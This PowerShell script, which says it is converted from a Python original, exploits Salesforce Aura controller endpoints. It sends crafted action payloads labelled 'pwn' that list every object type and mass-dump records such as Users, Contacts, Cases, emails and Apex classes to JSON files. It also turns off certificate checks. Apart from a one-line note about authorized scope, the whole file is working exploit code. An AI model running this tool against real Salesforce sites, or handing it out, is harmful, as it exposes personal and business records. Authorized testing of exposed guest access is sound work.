# aura_salesforce.ps1
# Conversion PowerShell du script Python fourni.
# Usage: dans un périmètre autorisé uniquement.

param(
    [Parameter(Mandatory = $true)]
    [string]$Url,

    [Parameter(Mandatory = $true)]
    [Alias("A")]
    [string]$AuraContext,

    [Parameter(Mandatory = $true)]
    [Alias("T")]
    [string]$Token,

    [Alias("o")]
    [string[]]$Objects = @("User"),

    [Alias("l")]
    [switch]$ListObj,

    [Alias("r")]
    [string]$RecordId,

    [Alias("d")]
    [switch]$DumpObjects,

    [ValidateSet("standard", "custom", "both")]
    [string]$ObjectType = "both",

    [Alias("f")]
    [switch]$Full,

    [string]$Cookie,

    [string]$Proxy,

    [switch]$Apex,

    [string]$OutputDir,

    [switch]$CustomFields
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

$DefaultPageSize = 100
$MaxPageSize     = 1000
$DefaultPage     = 1
$ApexPageSize    = 25

$UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36"

$PayloadPullCustomObj = @{
    actions = @(
        @{
            id                = "pwn"
            descriptor        = "serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION`$getConfigData"
            callingDescriptor = "UNKNOWN"
            params            = @{}
        }
    )
} | ConvertTo-Json -Compress -Depth 20

$SfObjectName = @(
    "Case", "Account", "User", "Contact", "Document", "ContentDocument",
    "ContentVersion", "ContentBody", "CaseComment", "Note", "Employee",
    "Attachment", "EmailMessage", "CaseExternalDocument", "Lead", "Name",
    "EmailTemplate", "EmailMessageRelation"
)

function New-AuraHttpClient {
    param(
        [string]$ProxyUrl
    )

    Add-Type -AssemblyName System.Net.Http

    $handler = [System.Net.Http.HttpClientHandler]::new()

    # Python original: ssl CERT_NONE / check_hostname False.
    try {
        $handler.ServerCertificateCustomValidationCallback = { param($sender, $cert, $chain, $errors) $true }
    }
    catch {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    }

    if ([string]::IsNullOrWhiteSpace($ProxyUrl)) {
        # Python original disables system proxy defaults.
        $handler.UseProxy = $false
    }
    else {
        $handler.UseProxy = $true
        $handler.Proxy = [System.Net.WebProxy]::new($ProxyUrl)
    }

    return [System.Net.Http.HttpClient]::new($handler)
}

function New-AuraSession {
    param(
        [string]$Url,
        [string]$AuraContext,
        [string]$Token,
        [string]$Cookie,
        [string]$Proxy,
        [string]$OutputDir
    )

    return [pscustomobject]@{
        Url        = $Url
        Context    = $AuraContext
        Token      = $Token
        Cookie     = $Cookie
        Proxy      = $Proxy
        OutputDir  = $OutputDir
        HttpClient = New-AuraHttpClient -ProxyUrl $Proxy
    }
}

function Invoke-AuraHttpRequest {
    param(
        [Parameter(Mandatory = $true)]
        $Aura,

        [Parameter(Mandatory = $true)]
        [string]$RequestUrl,

        [byte[]]$RawPostBody = $null,

        [ValidateSet("GET", "POST")]
        [string]$Method = "GET"
    )

    $request = [System.Net.Http.HttpRequestMessage]::new(
        [System.Net.Http.HttpMethod]::$Method,
        $RequestUrl
    )

    [void]$request.Headers.TryAddWithoutValidation("User-Agent", $UserAgent)

    if (-not [string]::IsNullOrWhiteSpace($Aura.Cookie)) {
        [void]$request.Headers.TryAddWithoutValidation("Cookie", $Aura.Cookie)
    }

    if ($Method -eq "POST") {
        if ($null -eq $RawPostBody) {
            $RawPostBody = [byte[]]@()
        }

        $content = [System.Net.Http.ByteArrayContent]::new($RawPostBody)
        [void]$content.Headers.TryAddWithoutValidation("Content-Type", "application/x-www-form-urlencoded")
        $request.Content = $content
    }

    $response = $Aura.HttpClient.SendAsync($request).GetAwaiter().GetResult()
    $body = $response.Content.ReadAsStringAsync().GetAwaiter().GetResult()

    if (-not $response.IsSuccessStatusCode) {
        throw "HTTP $([int]$response.StatusCode) $($response.ReasonPhrase). Response -> $body"
    }

    return $body
}

function Invoke-AuraExploit {
    param(
        [Parameter(Mandatory = $true)]
        $Aura,

        [Parameter(Mandatory = $true)]
        [string]$Payload
    )

    $endpointUrl = $Aura.Url + "?r=1&applauncher.LoginForm.getLoginRightFrameUrl=1"

    # Important: aura.context et aura.token ne sont PAS URL-encodés,
    # comme dans le script Python original.
    $postBodyString = "message=$Payload&aura.context=$($Aura.Context)&aura.token=$($Aura.Token)"
    $rawBytes = [System.Text.Encoding]::UTF8.GetBytes($postBodyString)

    $responseBody = Invoke-AuraHttpRequest `
        -Aura $Aura `
        -RequestUrl $endpointUrl `
        -RawPostBody $rawBytes `
        -Method "POST"

    try {
        return $responseBody | ConvertFrom-Json
    }
    catch {
        throw "JSON Decode error. Response -> $responseBody"
    }
}

function Get-AuraOutputDir {
    param(
        [Parameter(Mandatory = $true)]
        $Aura
    )

    if (-not [string]::IsNullOrWhiteSpace($Aura.OutputDir)) {
        return $Aura.OutputDir
    }

    $parsed = [Uri]$Aura.Url
    $path = $parsed.AbsolutePath.Trim("/")
    if ([string]::IsNullOrWhiteSpace($path)) {
        $pathSanitised = "root"
    }
    else {
        $pathSanitised = $path.Replace("/", "_")
    }

    $netloc = $parsed.Authority.Replace(":", "_")
    $dirName = "{0}_{1}_{2}" -f $parsed.Scheme, $netloc, $pathSanitised

    return Join-Path -Path (Get-Location).Path -ChildPath $dirName
}

function New-GetItemsPayload {
    param(
        [Parameter(Mandatory = $true)]
        [string]$ObjectName,

        [int]$PageSize,

        [int]$Page
    )

    return @{
        actions = @(
            @{
                id                = "pwn"
                descriptor        = "serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION`$getItems"
                callingDescriptor = "UNKNOWN"
                params            = @{
                    entityNameOrId   = $ObjectName
                    layoutType       = "FULL"
                    pageSize         = $PageSize
                    currentPage      = $Page
                    useTimeout       = $false
                    getCount         = $true
                    enableRowActions = $false
                }
            }
        )
    } | ConvertTo-Json -Compress -Depth 20
}

function New-GetRecordPayload {
    param(
        [Parameter(Mandatory = $true)]
        [string]$RecordId
    )

    return @{
        actions = @(
            @{
                id                = "pwn"
                descriptor        = "serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION`$getRecord"
                callingDescriptor = "UNKNOWN"
                params            = @{
                    recordId              = $RecordId
                    record                = $null
                    inContextOfComponent  = ""
                    mode                  = "VIEW"
                    layoutType            = "FULL"
                    defaultFieldValues    = $null
                    navigationLocation    = "LIST_VIEW_ROW"
                }
            }
        )
    } | ConvertTo-Json -Compress -Depth 20
}

function Get-PageSize {
    param(
        [bool]$DumpFull,
        [string]$ObjectName
    )

    if ($ObjectName -eq "ApexClass") {
        return $ApexPageSize
    }

    if ($DumpFull) {
        return $MaxPageSize
    }

    return $DefaultPageSize
}

function Get-JsonPropertyNames {
    param(
        [Parameter(Mandatory = $true)]
        $Object
    )

    if ($null -eq $Object) {
        return @()
    }

    return @($Object.PSObject.Properties.Name)
}

function Extract-ErrorMessage {
    param(
        $Errors
    )

    try {
        $raw = @($Errors)[0].event.attributes.values.message
        if ($null -eq $raw) {
            return "Unknown error"
        }
        return ($raw -replace "`r?`n", " ")
    }
    catch {
        return "Unknown error"
    }
}

function Get-AuraObjects {
    param(
        [Parameter(Mandatory = $true)]
        $Aura,

        [Parameter(Mandatory = $true)]
        [string]$ObjectName,

        [int]$PageSize = $DefaultPageSize,

        [int]$Page = $DefaultPage
    )

    $payload = New-GetItemsPayload -ObjectName $ObjectName -PageSize $PageSize -Page $Page

    try {
        $response = Invoke-AuraExploit -Aura $Aura -Payload $payload

        if ($null -ne $response.PSObject.Properties["exceptionEvent"]) {
            if ($response.exceptionEvent) {
                throw ($response | ConvertTo-Json -Depth 50)
            }
        }
    }
    catch {
        Write-Host "[-] Failed to retrieve or exploit."
        Write-Host "[-] Error: $($_.Exception.Message)"
        return $null
    }

    $actions = @($response.actions)
    if ($actions.Count -eq 0) {
        return $null
    }

    $actionData = $actions[0]
    $state = $actionData.state

    if ($state -eq "ERROR") {
        $message = Extract-ErrorMessage -Errors $actionData.error
        Write-Host "[-] Error message: $message"
        return $null
    }

    $returnValue = $actionData.returnValue
    if ($null -eq $returnValue) {
        return $null
    }

    $results = @()
    if ($null -ne $returnValue.PSObject.Properties["result"] -and $null -ne $returnValue.result) {
        $results = @($returnValue.result)
    }

    if ($results.Count -ne 0) {
        return $response
    }

    return $null
}

function Get-AuraObjectList {
    param(
        [Parameter(Mandatory = $true)]
        $Aura
    )

    $response = Invoke-AuraExploit -Aura $Aura -Payload $PayloadPullCustomObj

    if ($null -ne $response.PSObject.Properties["exceptionEvent"]) {
        if ($response.exceptionEvent) {
            throw ($response | ConvertTo-Json -Depth 50)
        }
    }

    $actions = @($response.actions)
    if ($actions.Count -eq 0 -or $null -eq $actions[0].state) {
        throw "Failed to get actions: $($response | ConvertTo-Json -Depth 50)"
    }

    $returnValue = $actions[0].returnValue
    $objectMap = $returnValue.apiNamesToKeyPrefixes

    return (Get-JsonPropertyNames -Object $objectMap | Sort-Object)
}

function Write-AuraObject {
    param(
        [Parameter(Mandatory = $true)]
        $Aura,

        [Parameter(Mandatory = $true)]
        [string]$ObjectName,

        [Parameter(Mandatory = $true)]
        [int]$Page,

        [Parameter(Mandatory = $true)]
        $Value
    )

    $dir = Get-AuraOutputDir -Aura $Aura
    New-Item -ItemType Directory -Force -Path $dir | Out-Null

    $filePath = Join-Path -Path $dir -ChildPath ("{0}__page{1}.json" -f $ObjectName, $Page)
    $Value | ConvertTo-Json -Depth 100 | Set-Content -Path $filePath -Encoding UTF8
}

function Identify-CustomFields {
    param(
        $ReturnValue
    )

    $customFields = New-Object System.Collections.Generic.HashSet[string]

    function Recurse-Object {
        param($Obj)

        if ($null -eq $Obj) {
            return
        }

        foreach ($item in @($Obj)) {
            if ($null -eq $item) {
                continue
            }

            # PowerShell JSON objects
            $props = $item.PSObject.Properties
            if ($null -eq $props -or $props.Count -eq 0) {
                continue
            }

            foreach ($prop in $props) {
                $key = $prop.Name
                $value = $prop.Value

                if ($key.EndsWith("__c")) {
                    [void]$customFields.Add($key)
                }

                if ($null -eq $value) {
                    continue
                }

                if ($value -is [System.Collections.IEnumerable] -and $value -isnot [string]) {
                    foreach ($sub in $value) {
                        Recurse-Object -Obj $sub
                    }
                }
                else {
                    $sobjectTypeProp = $value.PSObject.Properties["sobjectType"]
                    if ($null -eq $sobjectTypeProp) {
                        Recurse-Object -Obj $value
                    }
                }
            }
        }
    }

    $results = @()
    if ($null -ne $ReturnValue.PSObject.Properties["result"] -and $null -ne $ReturnValue.result) {
        $results = @($ReturnValue.result)
    }

    foreach ($result in $results) {
        $recordProp = $result.PSObject.Properties["record"]
        if ($null -ne $recordProp -and $null -ne $recordProp.Value) {
            Recurse-Object -Obj $recordProp.Value
        }
        else {
            Recurse-Object -Obj $result
        }
    }

    return @($customFields | Sort-Object)
}

function Write-CustomFieldsInfo {
    param(
        [Parameter(Mandatory = $true)]
        [string]$OutputDir,

        [Parameter(Mandatory = $true)]
        [string]$ObjectName,

        [Parameter(Mandatory = $true)]
        [string[]]$Fields
    )

    $filePath = Join-Path -Path $OutputDir -ChildPath "custom_fields_summary.txt"
    $exists = Test-Path -Path $filePath

    if (-not $exists) {
        "Custom Fields Summary`n===================`n" | Set-Content -Path $filePath -Encoding UTF8
    }

    if ($Fields.Count -gt 0) {
        Add-Content -Path $filePath -Encoding UTF8 -Value "Object: $ObjectName"
        Add-Content -Path $filePath -Encoding UTF8 -Value "Custom Fields:"
        foreach ($field in ($Fields | Sort-Object)) {
            Add-Content -Path $filePath -Encoding UTF8 -Value "  - $field"
        }
        Add-Content -Path $filePath -Encoding UTF8 -Value ""
    }
}

function Handle-DumpRecord {
    param(
        [Parameter(Mandatory = $true)]
        $Aura,

        [Parameter(Mandatory = $true)]
        [string]$RecordId
    )

    Write-Host "[+] Dumping record: $RecordId"
    $payload = New-GetRecordPayload -RecordId $RecordId

    try {
        $response = Invoke-AuraExploit -Aura $Aura -Payload $payload
    }
    catch {
        Write-Host "[-] Failed to dump the record."
        Write-Host "[-] Error: $($_.Exception.Message)"
        return
    }

    $actions = @($response.actions)
    if ($actions.Count -eq 0 -or $actions[0].state -ne "SUCCESS") {
        Write-Host "[-] Record dump did not succeed (state != SUCCESS)."
        return
    }

    Write-Host "[+] State: $($actions[0].state)"
    Write-Host "[+] Record result:"
    $actions[0].returnValue | ConvertTo-Json -Depth 100
}

function Handle-DumpObjects {
    param(
        [Parameter(Mandatory = $true)]
        $Aura,

        [string[]]$ObjectNames = $null,

        [bool]$DumpFull = $false,

        [bool]$Display = $false,

        [ValidateSet("standard", "custom", "both")]
        [string]$ObjectType = "both",

        [bool]$IdentifyCustom = $false
    )

    if ($null -eq $ObjectNames) {
        $allObjects = Get-AuraObjectList -Aura $Aura

        if ($ObjectType -eq "standard") {
            $ObjectNames = @($allObjects | Where-Object { -not $_.EndsWith("__c") })
        }
        elseif ($ObjectType -eq "custom") {
            $ObjectNames = @($allObjects | Where-Object { $_.EndsWith("__c") })
        }
        else {
            $ObjectNames = @($allObjects)
        }

        Write-Host "[+] Filtering objects by type: $ObjectType"
        Write-Host "[+] Found $($ObjectNames.Count) objects to dump"
    }

    $failedObjects = New-Object System.Collections.Generic.List[string]

    for ($num = 0; $num -lt $ObjectNames.Count; $num++) {
        $objectName = $ObjectNames[$num]
        $page = $DefaultPage
        $pageSize = Get-PageSize -DumpFull:$DumpFull -ObjectName $objectName
        $objectCustomFields = New-Object System.Collections.Generic.HashSet[string]

        while ($true) {
            Write-Host ("[+] {0}/{1}) Getting '{2}' object (page {3})..." -f ($num + 1), $ObjectNames.Count, $objectName, $page)

            $response = Get-AuraObjects -Aura $Aura -ObjectName $objectName -PageSize $pageSize -Page $page
            if ($null -eq $response) {
                [void]$failedObjects.Add($objectName)
                break
            }

            $returnValue = @($response.actions)[0].returnValue
            Write-AuraObject -Aura $Aura -ObjectName $objectName -Page $page -Value $returnValue

            if ($IdentifyCustom -and -not $objectName.EndsWith("__c")) {
                foreach ($field in (Identify-CustomFields -ReturnValue $returnValue)) {
                    [void]$objectCustomFields.Add($field)
                }
            }

            if ($Display) {
                $returnValue | ConvertTo-Json -Depth 100
            }

            $page++

            $results = @()
            if ($null -ne $returnValue.PSObject.Properties["result"] -and $null -ne $returnValue.result) {
                $results = @($returnValue.result)
            }

            if (-not $DumpFull) {
                break
            }

            if ($results.Count -eq 0) {
                break
            }

            if ($results.Count -lt $pageSize) {
                break
            }
        }

        if ($IdentifyCustom -and $objectCustomFields.Count -gt 0) {
            Write-CustomFieldsInfo `
                -OutputDir (Get-AuraOutputDir -Aura $Aura) `
                -ObjectName $objectName `
                -Fields @($objectCustomFields | Sort-Object)
        }
    }

    if ($failedObjects.Count -gt 0) {
        Write-Host "[-] Failed to dump: $($failedObjects -join ', ')"
    }
}

function Handle-ListObjects {
    param(
        [Parameter(Mandatory = $true)]
        $Aura
    )

    $objectsList = Get-AuraObjectList -Aura $Aura

    $defaultObjects = @($objectsList | Where-Object { -not $_.EndsWith("__c") })
    $customObjects  = @($objectsList | Where-Object { $_.EndsWith("__c") })

    Write-Host "[+] Found $($objectsList.Count) objects"
    Write-Host "[+] > $($defaultObjects.Count) standard salesforce objects"
    Write-Host "[+] > $($customObjects.Count) custom salesforce objects"

    Write-Host "[+] Standard objects:"
    $defaultObjects | ForEach-Object { Write-Host $_ }

    Write-Host "[+] Custom objects:"
    $customObjects | ForEach-Object { Write-Host $_ }
}

Write-Host "[+] Starting exploit with user-supplied aura_context and token (no URL encoding)..."

$aura = New-AuraSession `
    -Url $Url `
    -AuraContext $AuraContext `
    -Token $Token `
    -Cookie $Cookie `
    -Proxy $Proxy `
    -OutputDir $OutputDir

if ($ListObj) {
    Handle-ListObjects -Aura $aura
}
elseif (-not [string]::IsNullOrWhiteSpace($RecordId)) {
    Handle-DumpRecord -Aura $aura -RecordId $RecordId
}
elseif ($DumpObjects) {
    Handle-DumpObjects `
        -Aura $aura `
        -DumpFull:$Full.IsPresent `
        -ObjectType $ObjectType `
        -IdentifyCustom:$CustomFields.IsPresent
}
elseif ($Apex) {
    Handle-DumpObjects `
        -Aura $aura `
        -ObjectNames @("ApexClass") `
        -DumpFull:$true `
        -ObjectType "both" `
        -IdentifyCustom:$CustomFields.IsPresent
}
else {
    Handle-DumpObjects `
        -Aura $aura `
        -ObjectNames $Objects `
        -DumpFull:$Full.IsPresent `
        -Display:$true `
        -ObjectType "both" `
        -IdentifyCustom:$CustomFields.IsPresent
}
